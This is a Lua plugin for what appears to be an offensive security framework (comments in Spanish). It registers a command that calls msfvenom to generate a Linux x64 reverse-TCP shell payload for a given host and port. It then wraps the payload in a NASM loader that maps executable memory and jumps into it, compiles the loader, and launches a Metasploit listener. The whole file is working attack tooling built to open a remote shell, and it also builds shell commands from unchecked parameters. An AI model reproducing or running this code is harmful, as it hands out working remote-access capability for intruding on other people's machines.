-- Función para ejecutar comandos del sistema y guardar la salida en un archivo
local function execute_command_to_file(command, output_file)
    os.execute(command .. " > " .. output_file)
end

-- Función para leer un archivo y devolver su contenido
local function read_file(file_path)
    local file = io.open(file_path, "r")
    if not file then
        return nil, "Error: Could not open file at " .. file_path
    end
    local content = file:read("*a")
    file:close()
    return content
end

-- Función para convertir un shellcode hexadecimal a formato NASM
local function hex_to_nasm(hex_string)
    -- Validar y limpiar la entrada hexadecimal
    local clean_hex = hex_string:gsub("%W", "")
    if #clean_hex % 2 ~= 0 then
        return nil, "Invalid hex string length (odd number of characters)"
    end

    -- Convertir a una lista de bytes
    local byte_list = {}
    for i = 1, #clean_hex, 2 do
        table.insert(byte_list, string.format("0x%s", clean_hex:sub(i, i+1)))
    end

    -- Generar el código NASM
    local nasm_code = {
        "section .data",
        "shellcode:"
    }

    -- Dividir en líneas de 16 bytes
    for i = 1, #byte_list, 16 do
        local chunk = table.concat(byte_list, ",", i, math.min(i + 15, #byte_list))
        table.insert(nasm_code, string.format("    db %s", chunk))
    end

    table.insert(nasm_code, "shellcode_len equ $ - shellcode\n")

    return table.concat(nasm_code, "\n"), nil
end

-- Función para generar el cargador en ensamblador NASM
local function generate_loader(hex_string)
    local nasm_code, err = hex_to_nasm(hex_string)
    if not nasm_code then
        return nil, err
    end

    -- Generar el código del cargador
    local loader_code = [[
section .text
global _start
_start:
    ; 1. Asignar memoria ejecutable con mmap
    mov  rax, 9        ; syscall mmap
    xor  rdi, rdi      ; addr = NULL
    mov  rsi, shellcode_len ; tamaño
    mov  rdx, 7        ; PROT_READ|PROT_WRITE|PROT_EXEC
    mov  r10, 0x22     ; MAP_PRIVATE|MAP_ANONYMOUS
    mov  r8, -1        ; fd = -1
    xor  r9, r9        ; offset = 0
    syscall

    ; 2. Copiar shellcode a la nueva memoria
    mov  rdi, rax      ; destino
    lea  rsi, [rel shellcode] ; origen
    mov  rcx, shellcode_len
    rep  movsb         ; copia byte a byte

    ; 3. Saltar al shellcode
    jmp  rax

]] .. nasm_code

    -- Guardar el código ensamblador en un archivo
    local file_path = "sessions/loader.asm"
    local file = io.open(file_path, "w")
    if not file then
        return nil, "Error: Could not create file at " .. file_path
    end

    file:write(loader_code)
    file:close()

    -- Intentar compilar y vincular el binario
    local nasm_command = "nasm -f elf64 " .. file_path .. " -o sessions/loader.o && ld sessions/loader.o -o sessions/loader"
    local success = os.execute(nasm_command)

    -- Retornar el resultado
    if success then
        return "Loader generated successfully. Binary saved at sessions/loader."
    else
        return "Loader.asm generated, but there were errors during compilation."
    end
end

-- Función principal para generar el shellcode y el cargador
local function generate_msfvenom_loader(lhost, lport)
    if not lhost or not lport then
        return "Error: lhost or lport not defined."
    end

    -- Archivo temporal para guardar la salida de msfvenom
    local temp_file = "sessions/msfvenom_output.txt"

    -- Generar el shellcode con msfvenom y guardar la salida en un archivo
    local msfvenom_command = string.format(
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f hex -b '\\x00'",
        lhost, lport
    )
    execute_command_to_file(msfvenom_command, temp_file)

    -- Leer el archivo temporal y extraer el shellcode hexadecimal
    local content, err = read_file(temp_file)
    if not content then
        return "Error: " .. err
    end

    local shellcode_hex = content:match("(%x+)")
    if not shellcode_hex then
        return "Error: Failed to extract shellcode from msfvenom output."
    end

    -- Generar el cargador
    local result, err = generate_loader(shellcode_hex)
    if not result then
        return "Error: " .. err
    end
    print("Press 2 and enter to continue to metasploit listener")
    app.one_cmd("msf rev lin")
    return result
end

-- Registrar el comando
register_command("generate_msfvenom_loader", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]
    return generate_msfvenom_loader(lhost, lport)
end)
